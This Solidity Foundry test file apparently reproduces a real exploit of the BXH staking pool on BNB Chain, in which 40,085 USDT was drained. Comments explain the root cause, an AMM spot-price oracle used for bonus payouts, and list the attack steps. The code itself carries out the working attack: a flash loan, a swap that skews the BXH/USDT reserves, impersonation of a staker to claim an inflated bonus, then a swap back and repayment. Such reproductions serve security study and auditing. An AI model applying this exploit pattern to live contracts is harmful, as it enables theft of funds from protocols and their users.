// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Total Lost :  40085 USDT
// Attacker : 0x81c63d821b7cdf70c61009a81fef8db5949ac0c9
// Attack Contract : 0x4e77df7b9cdcecec4115e59546f3eacba095a89f
// Vulnerable Contract : https://bscscan.com/address/0x27539b1dee647b38e1b987c41c5336b1a8dce663
// Attack Tx  0xa13c8c7a0c97093dba3096c88044273c29cebeee109e23622cd412dcca8f50f4

// VULNERABILITY: Manipulable Spot-Price Oracle for Bonus Reward Payouts (getITokenBonusAmount)
// Root Cause Analysis:
//   The TokenStakingPoolDelegate contract (pid=0 has enableBonus=true, bonusToken=USDT, iToken=BXH, swapPairAddress=BXH/USDT pair)
//   converts accrued iToken rewards into bonusToken using a direct spot price from the AMM pair (no TWAP, no protection).
//   - PoolInfo.swapPairAddress + enableBonus set via add()/setBonus() by admin (no on-chain safeguards).
//   - Claim path: deposit(_pid, 0) when user.amount>0 → depositIToken → if(enableBonus) pendingAmount = getITokenBonusAmount(_pid, pendingAmount) → safeBonusTransfer (transfers from pool's bonusToken balance).
//   - See also in withdraw path and delegate deposit.
// Code references (in vulnerable impl):
//   sources/TokenStakingPoolDelegate_27539B/TokenStakingPoolDelegate.sol:
//     - getITokenBonusAmount(uint256 _pid, uint256 _amountInToken):1602
//         (uint112 _reserve0, uint112 _reserve1, ) = IUniswapV2Pair(pool.swapPairAddress).getReserves();
//         ... getAmountOut( _amountInToken , appropriate reserves, _fee=0 );
//     - getAmountOut(uint amountIn, uint reserveIn, uint reserveOut, uint256 feeFactor):1616
//         uint amountInWithFee = amountIn.mul(feeBase.sub(feeFactor)); // feeFactor=0 → no fee
//         uint numerator = amountInWithFee.mul(reserveOut);
//         uint denominator = reserveIn.mul(feeBase).add(amountInWithFee);
//         return numerator / denominator;
//     - Claim sites: depositIToken:1969 (if branch), depositITokenByDelegate:1934, withdrawIToken:2039
//     - Pool struct comment even says: "use the swap pair to caculate bonustoken swap ratio, need check the pair price."
// Why it works (economic mechanism):
//   Flashloan + atomic swap USDT→BXH on the target pair depletes BXH reserves (reserveIn small) while inflating USDT reserves (reserveOut large).
//   Thus getAmountOut(small_pending_BXH, tiny_BXH_res, huge_USDT_res, 0) yields massive USDT out (high price impact favors the "seller" of BXH in simulation).
//   The pending ~15 BXH (from prior vUSDT stake by 0x4e77...) is "valued" at ~40k+ USDT. Pool blindly transfers that much USDT.
//   Attacker also holds the BXH bought during skew (at "cheap" effective rate), sells it back post-claim to realize/repay.
//   Uses deposit(0,0) to harvest without adding new capital or lock. Fee=0 in simulator > real swap fees.
//   No reentrancy on the price read (view), flashloan callback lives in same tx.
// Impact:
//   - Direct drain of pool's USDT bonus reserves (contract held the funds for bonus payouts).
//   - Any staker with pending rewards at time of attack can be front-run or the pool drained before normal claims.
//   - Total: 40085 USDT stolen. Protocol's "bonus" economic design inverted by oracle.
//   - Broader: classic "use spot AMM reserves for value conversion in rewards/liquidations" without TWAP/slippage/volume guards.
// EXPLOIT STEPS:
// 1. (Pre-attack, not in tx): User at 0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f (==attack contract) deposited vUSDT into pid=0 of staking pool, accruing pending BXH (iToken) rewards.
// 2. Flash-borrow large USDT (3.178M) from unrelated Pancake USDT/WBNB pair (0x16b9..) via usdtwbnbpair.swap(..., data) → triggers pancakeCall.
// 3. In callback: Approve and call bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( most USDT bal - gift, path=[USDT, BXH], to=this ).
//    This is the manipulation: pair's USDT reserve ↑, BXH reserve ↓.
// 4. usdt.transfer( staking contract, small gift ~805 USDT ) — ensures pool has enough balance to pay the inflated claim.
// 5. cheat.startPrank(staker); bxhtokenstaking.deposit(0, 0); ... stopPrank();
//    → inside: updatePool, compute pending = user.amount * acc /1e12 - debt (~15 BXH), since enableBonus: pending = getITokenBonusAmount(0, ~15e18) [queries manipulated pair] → safeBonusTransfer(USDT, staker, huge_amount) → hacker receives inflated USDT.
// 6. Approve and swap the BXH (acquired in step 3) back: bxhRouter.swapExact... (path=[BXH, USDT]) → converts to USDT at post-manip price (or after pair reverts somewhat).
// 7. Compute swapfee = amount0 * 26 / 10000; usdt.transfer( flash pair, amount0 + swapfee );
// 8. Attacker keeps the net USDT profit. Pair reserves return to normal after tx (or arbitraged).
// Note: In this PoC the Attacker contract itself receives the flash and does the pranks; historically attack contract addr coincided with staker.

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IERC20 constant BXH = IERC20(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);

contract Attacker is Test {
    IERC20 constant vUSDT = IERC20(0x19195aC5F36F8C75Da129Afca8f92009E292B84a);
    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakeRouter constant bxhRouter = IPancakeRouter(payable(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01));

    IPancakePair constant usdtwbnbpair = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // wbnb/usdt Pair
    IPancakePair constant bxhusdtpair = IPancakePair(0x919964B7f12A742E3D33176D7aF9094EA4152e6f); // bxh/usdt Pair

    TokenStakingPoolDelegate constant bxhtokenstaking =
        TokenStakingPoolDelegate(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663);

    function setUp() public {
        cheat.createSelectFork("http://127.0.0.1:8546", 21_727_289);
        cheat.label(address(BXH), "BXH");
        cheat.label(address(usdt), "USDT");
        cheat.label(address(wbnb), "WBNB");
        cheat.label(address(pancakeRouter), "PancakeRouter");
        cheat.label(address(usdtwbnbpair), "usdt/wbnb Pair");
        cheat.label(address(bxhusdtpair), "bxh/usdt Pair");
        cheat.label(address(bxhRouter), "BXH Router");
    }

    function testExploit() public {
        // Before attack need deposit first

        // cheat.rollFork(21665464);
        // cheat.prank(0x81C63d821b7CdF70C61009A81FeF8Db5949AC0C9);

        // //emit log_named_decimal_uint("[Start]  VUSDT Balance Of 0x54f611135A9b88bbE23a8CF6C1310c59321F2717:", vUSDT.balanceOf(address(0x54f611135A9b88bbE23a8CF6C1310c59321F2717)), 18);
        // vUSDT.transfer(address(this), 5582000000000000000000);
        // emit log_named_decimal_uint("[Start] contract VUSDT Balance is:", vUSDT.balanceOf(address(this)), 18);

        // vUSDT.approve(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, type(uint256).max);

        // bxhtokenstaking.deposit(0, vUSDT.balanceOf(address(this)));
        // emit log_named_decimal_uint("[Start] contract Despoit VUSDT ", vUSDT.balanceOf(address(this)), 18);

        //cheat.rollFork(21727289);

        emit log_named_decimal_uint(
            "[Start] BXH-USDT  Pair USDT Balance is :",
            usdt.balanceOf(address(0x919964B7f12A742E3D33176D7aF9094EA4152e6f)),
            18
        );
        // VULNERABILITY: [Flashloan entrypoint for atomic price skew]
        // The flash is from a *different* pair (USDT/WBNB) so that the target BXH/USDT pair's liquidity is not the flash source,
        // allowing clean manipulation without repaying from same reserves. Classic pattern for pair-reserve oracles.
        usdtwbnbpair.swap(3_178_800_000_000_000_000_000_000, 0, address(this), "0x");

        emit log_named_decimal_uint("[Over] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("[Flashloan] received");
        //approve bxh router for usdt
        usdt.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(0x55d398326f99059fF775485246999027B3197955);
        path[1] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);

        // VULNERABILITY: [Oracle Manipulation via Direct Swap on Price Pair]
        // This swap (USDT -> BXH) directly alters the live reserves read by getITokenBonusAmount in the staking contract.
        // No check that caller is pair, no TWAP, swap is on the exact pair used for bonus conversion.
        // Effect: reserve_BXH ↓ , reserve_USDT ↑  → simulated BXH->USDT gives ~1000x more USDT.
        bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdt.balanceOf(address(this)) - 805_614_870_582_412_124_618, 1, path, address(this), block.timestamp
        );
        emit log_named_decimal_uint("[Flashloan] now Hacker BXH balance is :", BXH.balanceOf(address(this)), 18);

        usdt.transfer(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, 805_614_870_582_412_124_618);

        emit log_named_decimal_uint(
            "[Flashloan] now bxh contract USDT balance is :",
            usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)),
            18
        );

        // VULNERABILITY: [Reward Claim at Manipulated Price]
        // deposit(0, 0) is the harvest trigger (amount=0 just claims pending, see depositIToken: if(user.amount>0) compute+pay pending).
        // Because the staker (0x4e77..) had prior deposits, pending >0 → bonus payout computed from *current* (skewed) pair price.
        // The gift ensures the pool's USDT balance (bonusToken holdings) suffices for the huge transfer in safeBonusTransfer.
        // Note: startPrank used because in PoC the msg.sender of test must impersonate the historical staker.
        cheat.startPrank(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f);
        bxhtokenstaking.deposit(0, 0);
        usdt.transfer(address(this), usdt.balanceOf(address(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f)));
        cheat.stopPrank();

        emit log_named_decimal_uint("[Flashloan] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "[Flashloan] bxh contract USDT Balance is :",
            usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)),
            18
        );

        BXH.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);

        address[] memory bxh_usdtpath = new address[](2);
        bxh_usdtpath[0] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);
        bxh_usdtpath[1] = address(0x55d398326f99059fF775485246999027B3197955);

        // Post-claim: convert the BXH (bought during manipulation) back to USDT. The net effect after repay is the drained bonus USDT.
        bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BXH.balanceOf(address(this)), 1, bxh_usdtpath, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[Flashloan] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);

        uint256 swapfee = amount0 * 26 / 10_000;

        usdt.transfer(address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE), amount0 + swapfee);
    }

    receive() external payable {}
}

interface TokenStakingPoolDelegate {
    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
    event DepositDelegate(address indexed user, address toUser, uint256 indexed pid, uint256 amount);
    event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event PoolAdded(
        uint256 _pid,
        uint256 _allocPoint,
        address _lpToken,
        bool _enableBonus,
        address _bonusToken,
        address _swapPairAddress,
        uint256 _lockSeconds,
        uint256 _depositMin,
        uint256 _depositMax
    );
    event PoolAllocateChanged(uint256 _pid, uint256 _allocPoint);
    event PoolBonusChanged(
        uint256 _pid, bool _enableBonus, address _bonusToken, address _swapPairAddress, uint256 _lockSeconds
    );
    event PoolDepositChanged(uint256 _pid, uint256 _depositMin, uint256 _depositMax);
    event SetDelegate(bool, address);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);

    function add(
        uint256 _allocPoint,
        address _lpToken,
        bool _enableBonus,
        address _bonusToken,
        address _swapPairAddress,
        uint256 _lockSeconds,
        uint256 _depositMin,
        uint256 _depositMax,
        bool _withUpdate
    ) external;

    function adminAddress() external view returns (address);

    function batchPrepareRewardTable(
        uint256 spareCount
    ) external returns (uint256);

    function claimAllReward() external;

    function claimBylpToken(
        address _lpToken
    ) external;

    function decayPeriod() external view returns (uint256);

    function decayRatio() external view returns (uint256);

    function decayTable(
        uint256
    ) external view returns (uint256);

    function delegateCaller() external view returns (address);

    function deposit(uint256 _pid, uint256 _amount) external;

    function depositByDelegate(uint256 _pid, address _toUser, uint256 _amount) external;

    function emergencyWithdraw(
        uint256 _pid
    ) external;

    function getITokenBlockRewardV(
        uint256 _lastRewardBlock
    ) external view returns (uint256);

    function getITokenBlockRewardV(uint256 _lastRewardBlock, uint256 blocknumber) external view returns (uint256);

    function getITokenBonusAmount(uint256 _pid, uint256 _amountInToken) external view returns (uint256);

    function iToken() external view returns (address);

    function lockedToken(uint256 _pid, address _user) external view returns (uint256);

    function massUpdatePools() external;

    function openDelegate() external view returns (bool);

    function owner() external view returns (address);

    function paused() external view returns (bool);

    function pending(uint256 _pid, address _user) external view returns (uint256, uint256);

    function pendingAllReward(
        address _user
    ) external view returns (uint256, uint256);

    function pendingBylpToken(address _lpToken, address _user) external view returns (uint256, uint256);

    function phase(
        uint256 blockNumber
    ) external view returns (uint256);

    function poolInfo(
        uint256
    )
        external
        view
        returns (
            address lpToken,
            uint256 allocPoint,
            uint256 lastRewardBlock,
            uint256 accITokenPerShare,
            uint256 totalAmount,
            uint256 lockSeconds,
            bool enableBonus,
            address bonusToken,
            address swapPairAddress,
            uint256 depositMin,
            uint256 depositMax
        );

    function poolLength() external view returns (uint256);

    function renounceOwnership() external;

    function rewardV(
        uint256 blockNumber
    ) external view returns (uint256);

    function safeGetITokenBlockReward(
        uint256 _lastRewardBlock
    ) external returns (uint256);

    function set(uint256 _pid, uint256 _allocPoint, bool _withUpdate) external;

    function setAdmin(
        address _adminAddress
    ) external;

    function setBonus(
        uint256 _pid,
        bool _enableBonus,
        address _bonusToken,
        address _swapPairAddress,
        uint256 _lockSeconds
    ) external;

    function setDecayPeriod(
        uint256 _block
    ) external;

    function setDecayRatio(
        uint256 _ratio
    ) external;

    function setDelegate(bool open, address caller) external;

    function setPause(
        bool _paused
    ) external;

    function setPoolDepositLimited(uint256 _pid, uint256 _depositMin, uint256 _depositMax) external;

    function setTokenPerBlock(
        uint256 _newPerBlock
    ) external;

    function startBlock() external view returns (uint256);

    function tokenPerBlock() external view returns (uint256);

    function totalAllocPoint() external view returns (uint256);

    function transferOwnership(
        address newOwner
    ) external;

    function updatePool(
        uint256 _pid
    ) external;

    function userDepositInfo(uint256, address, uint256) external view returns (uint256 orderTime, uint256 amount);

    function userInfo(
        uint256,
        address
    ) external view returns (uint256 amount, uint256 rewardDebt, uint256 rewardReceived, uint256 lastReceived);

    function withdraw(uint256 _pid, uint256 _amount) external returns (uint256);

    function withdrawBylpToken(address _lpToken, uint256 _amount) external;

    function withdrawEmergency(address tokenaddress, address to) external;

    function withdrawEmergencyNative(address to, uint256 amount) external;
}
